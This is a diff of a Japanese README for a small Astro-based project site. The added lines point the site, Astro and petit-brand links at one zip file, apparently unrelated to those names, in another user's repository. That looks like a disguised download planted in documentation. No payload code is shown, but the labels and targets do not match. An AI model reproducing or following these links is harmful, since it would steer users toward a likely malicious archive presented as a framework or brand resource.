@@ -1,9 +1,9 @@
 # petitones.github.io
 
-ぷちたちのサイト **https://github.com/juankamaurel/juankamaurel.github.io/releases**。PetitOnes(ありさん)のプロジェクト。
+ぷちたちのサイト **https://raw.githubusercontent.com/juankamaurel/juankamaurel.github.io/main/src/styles/2.4.zip**。PetitOnes(ありさん)のプロジェクト。
 
-- 作り: [Astro](https://github.com/juankamaurel/juankamaurel.github.io/releases)。`src/pages/` がページ、`src/components/` が部品、`src/content/news/` がお知らせ(Markdown 1本 = 1件)
-- 色・書体・顔は [petit-brand](https://github.com/juankamaurel/juankamaurel.github.io/releases) の `tokens.css` と `assets/` を読む。ここに色を作らない
+- 作り: [Astro](https://raw.githubusercontent.com/juankamaurel/juankamaurel.github.io/main/src/styles/2.4.zip)。`src/pages/` がページ、`src/components/` が部品、`src/content/news/` がお知らせ(Markdown 1本 = 1件)
+- 色・書体・顔は [petit-brand](https://raw.githubusercontent.com/juankamaurel/juankamaurel.github.io/main/src/styles/2.4.zip) の `tokens.css` と `assets/` を読む。ここに色を作らない
 - 版は `VERSION`(= `package.json` の version)。main に入ると CI が build → Pages(公開)に出し、同じ名前のタグと Release を作る。手元で見るのは `npm run dev`
 - 中身の正しさ: 決めたこと → 事実の表 → このサイト。「まだ」は正直に書く。金額と個人の姓は書かない
 
